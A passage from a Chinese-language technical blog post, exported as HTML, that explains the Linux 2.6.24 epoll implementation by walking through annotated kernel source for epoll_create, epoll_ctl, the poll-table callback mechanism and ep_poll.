class="keyword">goto</span> error_return;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 创建一个新的文件描述符，文件数据结构和i节点</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error = anon_inode_getfd(&amp;fd, &amp;inode, &amp;file, <span class="string">"[eventpoll]"</span>,</span><br><span class="line"> &amp;eventpoll_fops, ep);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">goto</span> error_free;</span><br><span class="line"></span><br><span class="line">DNPRINTK(<span class="number">3</span>, (KERN_INFO <span class="string">"[%p] eventpoll: sys_epoll_create(%d) = %d\n"</span>,</span><br><span class="line">     current, size, fd));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> fd;</span><br><span class="line"></span><br><span class="line">error_free:</span><br><span class="line">ep_free(ep);</span><br><span class="line">error_return:</span><br><span class="line">DNPRINTK(<span class="number">3</span>, (KERN_INFO <span class="string">"[%p] eventpoll: sys_epoll_create(%d) = %d\n"</span>,</span><br><span class="line">     current, size, error));</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g0qi7lrtgzj31eu0u075i.jpg" alt="Epoll Create | Model"></p><h3 id="epoll-ctl"><a href="#epoll-ctl" class="headerlink" title="epoll_ctl"></a><code>epoll_ctl</code></h3><p><code>epoll_ctl</code> 顾名思义——<code>epoll</code>控制器，用于增加、修改、删除监听的事件。这里 <code>epfd</code> 用于找到 <code>eventpoll</code> 实例，<code>fd</code> 表示需要监听的文件描述符，<code>op</code> 区分增删改，<code>event</code> 表示监听的具体事件描述。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_epoll_ctl</span><span class="params">(<span class="keyword">int</span> epfd, <span class="keyword">int</span> op, <span class="keyword">int</span> fd,</span></span></span><br><span class="line"><span class="function"><span class="params">      struct epoll_event __user *event)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>, *<span class="title">tfile</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eventpoll</span> *<span class="title">ep</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epitem</span> *<span class="title">epi</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">epds</span>;</span></span><br><span class="line"></span><br><span class="line">DNPRINTK(<span class="number">3</span>, (KERN_INFO <span class="string">"[%p] eventpoll: sys_epoll_ctl(%d, %d, %d, %p)\n"</span>,</span><br><span class="line">     current, epfd, op, fd, event));</span><br><span class="line"></span><br><span class="line">error = -EFAULT;</span><br><span class="line">    <span class="comment">/* 如果是增改操作，需要把事件描述拷贝到内核数据区; 删除操作不需要 */</span></span><br><span class="line"><span class="keyword">if</span> (ep_op_has_event(op) &amp;&amp;</span><br><span class="line">    copy_from_user(&amp;epds, event, <span class="keyword">sizeof</span>(struct epoll_event)))</span><br><span class="line"><span class="keyword">goto</span> error_return;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get the "struct file *" for the eventpoll file */</span></span><br><span class="line">error = -EBADF;</span><br><span class="line">file = fget(epfd);</span><br><span class="line"><span class="keyword">if</span> (!file)</span><br><span class="line"><span class="keyword">goto</span> error_return;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get the "struct file *" for the target file */</span></span><br><span class="line">tfile = fget(fd);</span><br><span class="line"><span class="keyword">if</span> (!tfile)</span><br><span class="line"><span class="keyword">goto</span> error_fput;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 需要监听的文件描述符必须支持文件操作 poll */</span></span><br><span class="line">error = -EPERM;</span><br><span class="line"><span class="keyword">if</span> (!tfile-&gt;f_op || !tfile-&gt;f_op-&gt;poll)</span><br><span class="line"><span class="keyword">goto</span> error_tgt_fput;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 需要确保不能把epfd作为被监听的fd加入 */</span></span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (file == tfile || !is_file_epoll(file))</span><br><span class="line"><span class="keyword">goto</span> error_tgt_fput;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 这里的文件描述符一定是指eventpoll实例对应的文件描述符</span></span><br><span class="line"><span class="comment">     * 因此直接从中拿私有数据--预定义的*eventpoll</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">ep = file-&gt;private_data;</span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;ep-&gt;mtx);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 从RB树中查找已经维护起来的监听事件</span></span><br><span class="line"><span class="comment">     * 当然，必须先把这个RB树结构锁定，防止查找时结构改变</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">epi = ep_find(ep, tfile, fd);</span><br><span class="line"></span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">switch</span> (op) &#123;</span><br><span class="line"><span class="keyword">case</span> EPOLL_CTL_ADD:     <span class="comment">// 新增监听</span></span><br><span class="line"><span class="keyword">if</span> (!epi) &#123;</span><br><span class="line">epds.events |= POLLERR | POLLHUP;</span><br><span class="line"></span><br><span class="line">error = ep_insert(ep, &amp;epds, tfile, fd);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">error = -EEXIST;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> EPOLL_CTL_DEL:     <span class="comment">// 删除监听</span></span><br><span class="line"><span class="keyword">if</span> (epi)</span><br><span class="line">error = ep_remove(ep, epi);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">error = -ENOENT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> EPOLL_CTL_MOD:     <span class="comment">// 修改监听</span></span><br><span class="line"><span class="keyword">if</span> (epi) &#123;</span><br><span class="line">epds.events |= POLLERR | POLLHUP;</span><br><span class="line">error = ep_modify(ep, epi, &amp;epds);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">error = -ENOENT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">mutex_unlock(&amp;ep-&gt;mtx);</span><br><span class="line"></span><br><span class="line">error_tgt_fput:</span><br><span class="line">fput(tfile);</span><br><span class="line">error_fput:</span><br><span class="line">fput(file);</span><br><span class="line">error_return:</span><br><span class="line">DNPRINTK(<span class="number">3</span>, (KERN_INFO <span class="string">"[%p] eventpoll: sys_epoll_ctl(%d, %d, %d, %p) = %d\n"</span>,</span><br><span class="line">     current, epfd, op, fd, event, error));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的核心操作，就是往 <code>eventpoll</code> 实例中增删改监听的事件。以 <code>ep_insert</code> 为例，先看看怎么新增监听。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 实例化 epitem */</span></span><br><span class="line"><span class="keyword">if</span> (!(epi = kmem_cache_alloc(epi_cache, GFP_KERNEL)))</span><br><span class="line">    <span class="keyword">goto</span> error_return;</span><br><span class="line"><span class="comment">/* 对 epitem 实例进行初始化数据 */</span></span><br><span class="line">ep_rb_initnode(&amp;epi-&gt;rbn);</span><br><span class="line">INIT_LIST_HEAD(&amp;epi-&gt;rdllink);</span><br><span class="line">INIT_LIST_HEAD(&amp;epi-&gt;fllink);</span><br><span class="line">INIT_LIST_HEAD(&amp;epi-&gt;pwqlist);</span><br><span class="line">epi-&gt;ep = ep;</span><br><span class="line"><span class="comment">/* 构建struct epoll_filefd，作为rb_tree比较不同的key */</span></span><br><span class="line">ep_set_ffd(&amp;epi-&gt;ffd, tfile, fd);</span><br><span class="line">epi-&gt;event = *event;</span><br><span class="line">epi-&gt;nwait = <span class="number">0</span>;</span><br><span class="line">epi-&gt;next = EP_UNACTIVE_PTR;</span><br></pre></td></tr></table></figure><p>接下来要接触的就是一段比较烧脑的逻辑。</p><p><code>poll_table</code> 是在 VFS 实现中相当重要的一个数据结构，用来与<code>poll</code>配合（这里的<code>poll</code>是指文件操作中的，而不是<code>poll()</code>系统调用）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">poll_table_struct</span> &#123;</span></span><br><span class="line">poll_queue_proc _qproc;</span><br><span class="line">&#125; poll_table;</span><br></pre></td></tr></table></figure><p>其中<code>poll_queue_proc</code>是一个函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*poll_queue_proc)</span><span class="params">(struct file *, <span class="keyword">wait_queue_head_t</span> *, struct poll_table_struct *)</span></span>;</span><br></pre></td></tr></table></figure><p>为了让 <code>epitem</code> 更方便地追踪 <code>poll_queue_proc</code>，<code>epoll_ctl</code> 中使用了一个 <code>ep_pqueue</code> 的数据结构来包装 <code>poll_table</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 使用 queue 回调函数初始化 poll table */</span></span><br><span class="line">epq.epi = epi;</span><br><span class="line">init_poll_funcptr(&amp;epq.pt, ep_ptable_queue_proc);</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1g0qwphhnz0j30xa0o6aan.jpg" alt=""></p><p>之后就是把这个 <code>poll_table</code> 作为钩子方法挂载到被监控的文件上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">revents = tfile-&gt;f_op-&gt;poll(tfile, &amp;epq.pt);</span><br></pre></td></tr></table></figure><p>这里以 <code>tcp_poll</code> 为例，先看看这段逻辑怎么实现的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sock_poll</span><span class="params">(struct file *file, poll_table *wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line">    <span class="comment">/* 获取 struct sock 内核套接字数据结构 */</span></span><br><span class="line">    sock = file-&gt;private_data;</span><br><span class="line">    <span class="keyword">return</span> sock-&gt;ops-&gt;poll(file, sock, wait);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">tcp_poll</span><span class="params">(struct file *file, struct socket *sock, poll_table *wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> mask;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcp_sock</span> *<span class="title">tp</span> = <span class="title">tcp_sk</span>(<span class="title">sk</span>);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 这里将调用 poll_table *wait 维护的回调函数</span></span><br><span class="line"><span class="comment">     * 将持有 eventpoll 实例的进程注册到 sk 的等待队列中</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">poll_wait(file, sk-&gt;sk_sleep, wait);</span><br><span class="line"><span class="keyword">if</span> (sk-&gt;sk_state == TCP_LISTEN)</span><br><span class="line"><span class="keyword">return</span> inet_csk_listen_poll(sk);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 这里省略了部分逻辑，主要是负责处理 struct sock 接收到的事件</span></span><br><span class="line"><span class="comment">     * 处理成 mask 并返回</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mask;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">poll_wait</span><span class="params">(struct file * filp, <span class="keyword">wait_queue_head_t</span> * wait_address, poll_table *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p &amp;&amp; wait_address)</span><br><span class="line">        p-&gt;qproc(filp, wait_address, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看看epoll定义的回调函数的实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ep_ptable_queue_proc</span><span class="params">(struct file *file, <span class="keyword">wait_queue_head_t</span> *whead,</span></span></span><br><span class="line"><span class="function"><span class="params"> poll_table *pt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epitem</span> *<span class="title">epi</span> = <span class="title">ep_item_from_epqueue</span>(<span class="title">pt</span>);</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eppoll_entry</span> *<span class="title">pwq</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (epi-&gt;nwait &gt;= <span class="number">0</span> &amp;&amp; (pwq = kmem_cache_alloc(pwq_cache, GFP_KERNEL))) &#123;</span><br><span class="line">init_waitqueue_func_entry(&amp;pwq-&gt;wait, ep_poll_callback);</span><br><span class="line">pwq-&gt;whead = whead;</span><br><span class="line">pwq-&gt;base = epi;</span><br><span class="line">        <span class="comment">/* 添加到 struct sock 等待队列队首 */</span></span><br><span class="line">add_wait_queue(whead, &amp;pwq-&gt;wait);</span><br><span class="line">list_add_tail(&amp;pwq-&gt;llink, &amp;epi-&gt;pwqlist);</span><br><span class="line">epi-&gt;nwait++;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* We have to signal that an error occurred */</span></span><br><span class="line">epi-&gt;nwait = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此为止，<code>ep_insert</code> 核心的逻辑已经介绍完毕。主要就是将当前的 <code>eventpoll</code> 实例注册到监听目标（文件描述符）的等待队列上，并注册<code>ep_poll_callback</code>作为回调函数。回调函数实现是怎样呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ep_poll_callback</span><span class="params">(<span class="keyword">wait_queue_t</span> *wait, <span class="keyword">unsigned</span> mode, <span class="keyword">int</span> sync, <span class="keyword">void</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> pwake = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="comment">/* 获取 wait 结构维护的 epitem 实例 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epitem</span> *<span class="title">epi</span> = <span class="title">ep_item_from_wait</span>(<span class="title">wait</span>);</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eventpoll</span> *<span class="title">ep</span> = <span class="title">epi</span>-&gt;<span class="title">ep</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... code omitted...</span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 把当前的 epitem 实例添加到 eventpoll 实例的就绪队列中 </span></span><br><span class="line"><span class="comment">     * 这是显然的，毕竟此回调函数只有在fd准备就绪后被回调</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">list_add_tail(&amp;epi-&gt;rdllink, &amp;ep-&gt;rdllist);</span><br><span class="line"></span><br><span class="line">is_linked:</span><br><span class="line">    <span class="comment">/* 如果 wait 结构维护的进程处于Sleeping状态，则将其唤醒并加入任务就绪队列 */</span></span><br><span class="line"><span class="keyword">if</span> (waitqueue_active(&amp;ep-&gt;wq))</span><br><span class="line">__wake_up_locked(&amp;ep-&gt;wq, TASK_UNINTERRUPTIBLE |</span><br><span class="line"> TASK_INTERRUPTIBLE);</span><br><span class="line"><span class="keyword">if</span> (waitqueue_active(&amp;ep-&gt;poll_wait))</span><br><span class="line">pwake++;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">spin_unlock_irqrestore(&amp;ep-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We have to call this outside the lock */</span></span><br><span class="line"><span class="keyword">if</span> (pwake)</span><br><span class="line">ep_poll_safewake(&amp;psw, &amp;ep-&gt;poll_wait);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="epoll-wait"><a href="#epoll-wait" class="headerlink" title="epoll_wait"></a><code>epoll_wait</code></h3><p>处理完所有的监听事件的维护，用户程序需要通过 <code>epoll_wait</code> 与 <code>eventpoll</code> 实例进行交互，并被告知所有正在监听中的事件是否发生。由于 <code>epoll_wait</code> 的整个逻辑基本上都是在进行错误检测，此处不表。我们只关注其中的核心逻辑，即调用的 <code>ep_poll</code> 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ep_poll</span><span class="params">(struct eventpoll *ep, struct epoll_event __user *events,</span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="keyword">int</span> maxevents, <span class="keyword">long</span> timeout)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> res, eavail;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="keyword">long</span> jtimeout;</span><br><span class="line"><span class="keyword">wait_queue_t</span> wait;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Calculate the timeout by checking for the "infinite" value ( -1 )</span></span><br><span class="line"><span class="comment"> * and the overflow condition. The passed timeout is in milliseconds,</span></span><br><span class="line"><span class="comment"> * that why (t * HZ) / 1000.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">jtimeout = (timeout &lt; <span class="number">0</span> || timeout &gt;= EP_MAX_MSTIMEO) ?</span><br><span class="line">MAX_SCHEDULE_TIMEOUT : (timeout * HZ + <span class="number">999</span>) / <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">retry:</span><br><span class="line">spin_lock_irqsave(&amp;ep-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line">res = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 如果 eventpoll 实例的就绪队列为空，表明有没任何监听的事件发生。</span></span><br><span class="line"><span class="comment">     * 主动让进程陷入Sleeping状态，知道被 ep_poll_callback() 唤醒</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (list_empty(&amp;ep-&gt;rdllist)) &#123;</span><br><span class="line">init_waitqueue_entry(&amp;wait, current);</span><br><span class="line">wait.flags |= WQ_FLAG_EXCLUSIVE;</span><br><span class="line">__add_wait_queue(&amp;ep-&gt;wq, &amp;wait);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We don't want to sleep if the ep_poll_callback() sends us</span></span><br><span class="line"><span class="comment"> * a wakeup in between. That's why we set the task state</span></span><br><span class="line"><span class="comment"> * to TASK_INTERRUPTIBLE before doing the checks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line"><span class="keyword">if</span> (!list_empty(&amp;ep-&gt;rdllist) || !jtimeout)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">res = -EINTR;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spin_unlock_irqrestore(&amp;ep-&gt;lock, flags);</span><br><span class="line">            <span class="comment">/* 主动陷入Sleeping状态 */</span></span><br><span class="line">jtimeout = schedule_timeout(jtimeout);</span><br><span class="line">spin_lock_irqsave(&amp;ep-&gt;lock, flags);</span><br><span class="line">&#125;</span><br><span class="line">__remove_wait_queue(&amp;ep-&gt;wq, &amp;wait);</span><br><span class="line"></span><br><span class="line">set_current_state(TASK_RUNNING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Is it worth to try to dig for events ? */</span></span><br><span class="line">eavail = !list_empty(&amp;ep-&gt;rdllist);</span><br><span class="line"></span><br><span class="line">spin_unlock_irqrestore(&amp;ep-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 将监听到的事件拷贝到用户空间。如果没有事件就绪且还没超时，就再抱着</span></span><br><span class="line"><span class="comment">     * 希望试一次。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!res &amp;&amp; eavail &amp;&amp;</span><br><span class="line">    !(res = ep_send_events(ep, events, maxevents)) &amp;&amp; jtimeout)</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Extra"><a href="#Extra" class="headerlink" title="Extra"></a>Extra</h3><p>这部分的数据结构配合着一些胶水代码比较难以理解，最好配合着类图看看（个人使用，不一定适合各位）</p><p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1g0rmx65dzhj324y0t8di4.jpg" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li>Linux Kernel 2.6.24</li><li><a href="https://idndx.com/2014/09/01/the-implementation-of-epoll-1/" target="_blank" rel="noopener">The Implementation of epoll(1)</a></li><li><a href="https://idndx.com/2014/09/02/the-implementation-of-epoll-2/" target="_blank" rel="noopener">The Implementation of epoll(2)</a></li><li><a href="https://idndx.com/2014/09/22/the-implementation-of-epoll-3/" target="_blank" rel="noopener">The Implementation of epoll(3)</a></li><li><a href="https://idndx.com/2015/07/08/the-implementation-of-epoll-4/" target="_blank" rel="noopener">The Implementation of epoll(4)</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  __                    __                  </span><br><span class="line"> / _| __ _ _ __   __ _ / _| ___ _ __   __ _ </span><br><span class="line">| |_ / _` | &apos;_ \ / _` | |_ / _ \ &apos;_ \ / _` |</span><br><span class="line">|  _| (_| | | | | (_| |  _|  __/ | | | (_| |</span><br><span class="line">|_|  \__,_|_| |_|\__, |_|  \___|_| |_|\__, |</span><br><span class="line">                 |___/                |___/</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
